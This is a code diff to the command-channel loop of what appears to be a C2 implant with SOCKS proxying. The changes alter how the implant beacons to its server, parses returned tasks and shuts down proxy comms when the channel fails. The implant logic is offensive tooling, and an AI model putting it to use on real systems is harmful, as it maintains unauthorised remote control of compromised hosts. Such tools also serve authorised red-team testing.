@@ -52,54 +52,54 @@ namespace ImplantSide.Classes.Comms
         CancellationTokenSource _cancelTokenSource { get; set; }
         CancellationToken _cancelToken { get; set; }
 
-        public void StartCommandLoop()
+        public void StartCommandLoop(SocksController loopController)
         {
             _cancelTokenSource = new CancellationTokenSource();
             _cancelToken = _cancelTokenSource.Token;
-            _commandChannelLoop = new System.Threading.Tasks.Task((g) => {
+			_commandChannelLoop = new System.Threading.Tasks.Task((g) => {
                 try
                 {
                     ImplantComms.LogMessage($"Command loop starting - beacon time is {C2Config.CommandBeaconTime}ms");
-                    _cmdCommsHandler.Send(CommandChannelSessionId, "nochange", UTF8Encoding.UTF8.GetBytes(BuildRequestPayload().ToString()).ToList());                    
-                    CommandLoop((CancellationToken)g);
-
-                }
+                    if (!CommandLoop((CancellationToken)g))
+					{
+						loopController.StopProxyComms();
+						_error.LogError($"Stopping all proxy comms as command channel is now broken");
+						return;
+					}
+				}
                 catch (Exception ex)
                 {
                     var lst = new List<String>
                     {
                         "Error in command channel loop"
                     };
-                    _error.FailError($"Command Channel loop is broken {ex.Message}, Should we HARD STOP ALL Connections?");
-                }
+                    _error.LogError($"Command Channel loop is broken {ex.Message}, hard stopping all connections");
+					loopController.StopProxyComms();
+					return;
+				}
             }, _cancelToken);
             _commandChannelLoop.Start();
         }
 
-        void CommandLoop(CancellationToken token)
+        bool CommandLoop(CancellationToken token)
         {
-            Int16 retryCounter = 0;
             do
             {
                 if (token.IsCancellationRequested)
-                    return;
+                    return true;
                 var request = BuildRequestPayload();
-                var response = _cmdCommsHandler.Send(CommandChannelSessionId, UTF8Encoding.UTF8.GetBytes(request.ToString()).ToList());
-                if (null == response || response.Count() == 0)
+                var response = _cmdCommsHandler.Send(CommandChannelSessionId, UTF8Encoding.UTF8.GetBytes(request.ToString()).ToList(), out bool CommandChannelDead);
+				
+                if (null == response || response.Count() == 0 || CommandChannelDead)
                 {
-                    _error.LogError($"Command Channel loop appears broken attempting to reconnect in {C2Config.CommandTimeoutRetryOnFailure/1000}s");
-                    Timeout.WaitOne(C2Config.CommandTimeoutRetryOnFailure);
-                    if ( ++retryCounter == (C2Config.CommandTimeoutRetryAttempts + 1))
-                    {
-                        _error.LogError($"Command Channel loop is dead attempted to reconnect {retryCounter} times. EXITING");
-                        return;
-                    }
+					if (CommandChannelDead)
+					{
+						_error.LogError($"Command Channel loop is dead. EXITING");
+						return false;
+					}
                 }
                 else
                 {
-                    //Reset the failure counter on reconnect
-                    retryCounter = 0;
-
                     var xdoc = XDocument.Parse(UTF8Encoding.UTF8.GetString(response.ToArray()));
                     var elms = xdoc.XPathSelectElements("Response/Tasks/Task");
 
@@ -149,11 +149,12 @@ namespace ImplantSide.Classes.Comms
                     //Sleep til we need to beacon again
                     //TO DO: Add in Jitter time, not curenntly implemented
                     if (token.IsCancellationRequested)
-                        return;
-                    Timeout.WaitOne(C2Config.CommandBeaconTime);
+                        return true;
                 }
-            }
+				Timeout.WaitOne(C2Config.CommandBeaconTime);
+			}
             while (!token.IsCancellationRequested);
+			return true;
         }
 
         XElement BuildRequestPayload()
